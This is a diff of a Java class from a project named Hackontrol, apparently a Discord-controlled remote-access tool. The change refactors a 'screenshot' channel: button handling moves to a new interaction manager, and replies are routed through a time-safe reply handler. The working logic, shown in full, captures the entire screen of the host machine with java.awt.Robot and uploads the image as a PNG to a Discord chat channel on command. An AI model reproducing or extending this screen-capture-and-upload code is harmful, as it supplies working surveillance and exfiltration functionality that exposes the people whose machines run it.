@@ -10,23 +10,27 @@ import java.util.Calendar;
 import javax.imageio.ImageIO;
 
 import com.khopan.hackontrol.HackontrolChannel;
-import com.khopan.hackontrol.manager.button.ButtonContext;
-import com.khopan.hackontrol.manager.button.ButtonManager;
+import com.khopan.hackontrol.manager.interaction.ButtonContext;
+import com.khopan.hackontrol.manager.interaction.ButtonManager;
+import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
+import com.khopan.hackontrol.manager.interaction.InteractionManager;
 import com.khopan.hackontrol.registry.Registry;
 import com.khopan.hackontrol.utils.HackontrolButton;
 import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.HackontrolMessage;
+import com.khopan.hackontrol.utils.TimeSafeReplyHandler;
+import com.khopan.hackontrol.utils.sendable.sender.ConsumerMessageCreateDataSendable;
 
 import net.dv8tion.jda.api.interactions.components.ActionRow;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
-import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
 import net.dv8tion.jda.api.utils.FileUpload;
+import net.dv8tion.jda.api.utils.messages.MessageCreateBuilder;
 
 public class ScreenshotChannel extends HackontrolChannel {
 	private static final String CHANNEL_NAME = "screenshot";
 
-	private static final Button BUTTON_SCREENSHOT = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Screenshot", "screenshot");
-	private static final Button BUTTON_REFRESH = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Refresh", "screenshotRefresh");
+	private static final Button BUTTON_SCREENSHOT = ButtonManager.staticButton(ButtonType.SUCCESS, "Screenshot", "screenshot");
+	private static final Button BUTTON_REFRESH    = ButtonManager.staticButton(ButtonType.SUCCESS, "Refresh",    "screenshotRefresh");
 
 	private Robot robot;
 
@@ -37,8 +41,8 @@ public class ScreenshotChannel extends HackontrolChannel {
 
 	@Override
 	public void preInitialize(Registry registry) {
-		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ScreenshotChannel.BUTTON_SCREENSHOT, this :: buttonScreenshot);
-		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ScreenshotChannel.BUTTON_REFRESH, this :: buttonRefresh);
+		registry.register(InteractionManager.BUTTON_REGISTRY, ScreenshotChannel.BUTTON_SCREENSHOT, this :: buttonScreenshot);
+		registry.register(InteractionManager.BUTTON_REGISTRY, ScreenshotChannel.BUTTON_REFRESH,    this :: buttonRefresh);
 	}
 
 	@Override
@@ -47,17 +51,20 @@ public class ScreenshotChannel extends HackontrolChannel {
 	}
 
 	private void buttonScreenshot(ButtonContext context) {
-		try {
-			if(this.robot == null) {
-				this.robot = new Robot();
-			}
+		TimeSafeReplyHandler.start(context, consumer -> {
+			try {
+				if(this.robot == null) {
+					this.robot = new Robot();
+				}
 
-			BufferedImage image = this.robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
-			context.replyFiles(ScreenshotChannel.uploadImage(image, "screenshot")).addActionRow(ScreenshotChannel.BUTTON_SCREENSHOT, ScreenshotChannel.BUTTON_REFRESH, HackontrolButton.delete()).queue(ButtonManager :: dynamicButtonCallback);
-		} catch(Throwable Errors) {
-			HackontrolError.throwable(context.reply(), Errors);
-			return;
-		}
+				MessageCreateBuilder builder = new MessageCreateBuilder();
+				builder.setFiles(ScreenshotChannel.uploadImage(this.robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())), "screenshot"));
+				builder.addActionRow(ScreenshotChannel.BUTTON_SCREENSHOT, ScreenshotChannel.BUTTON_REFRESH, HackontrolButton.delete());
+				consumer.accept(builder.build());
+			} catch(Throwable Errors) {
+				HackontrolError.throwable(ConsumerMessageCreateDataSendable.of(consumer), Errors);
+			}
+		});
 	}
 
 	private void buttonRefresh(ButtonContext context) {
@@ -68,15 +75,15 @@ public class ScreenshotChannel extends HackontrolChannel {
 	static FileUpload uploadImage(BufferedImage image, String baseName) throws Throwable {
 		ByteArrayOutputStream stream = new ByteArrayOutputStream();
 		ImageIO.write(image, "png", stream);
-		return FileUpload.fromData(stream.toByteArray(), ScreenshotChannel.getFileName(baseName));
-	}
+		String fileName;
 
-	static String getFileName(String baseName) {
 		try {
 			Calendar calendar = Calendar.getInstance();
-			return String.format("%s-%04d_%02d_%02d-%02d_%02d_%02d_%03d.png", baseName, calendar.get(Calendar.YEAR), calendar.get(Calendar.MONTH) + 1, calendar.get(Calendar.DAY_OF_MONTH), calendar.get(Calendar.HOUR_OF_DAY), calendar.get(Calendar.MINUTE), calendar.get(Calendar.SECOND), calendar.get(Calendar.MILLISECOND));
+			fileName = String.format("%s-%04d_%02d_%02d-%02d_%02d_%02d_%03d.png", baseName, calendar.get(Calendar.YEAR), calendar.get(Calendar.MONTH) + 1, calendar.get(Calendar.DAY_OF_MONTH), calendar.get(Calendar.HOUR_OF_DAY), calendar.get(Calendar.MINUTE), calendar.get(Calendar.SECOND), calendar.get(Calendar.MILLISECOND));
 		} catch(Throwable Errors) {
-			return baseName + ".png";
+			fileName = baseName + ".png";
 		}
+
+		return FileUpload.fromData(stream.toByteArray(), fileName);
 	}
 }
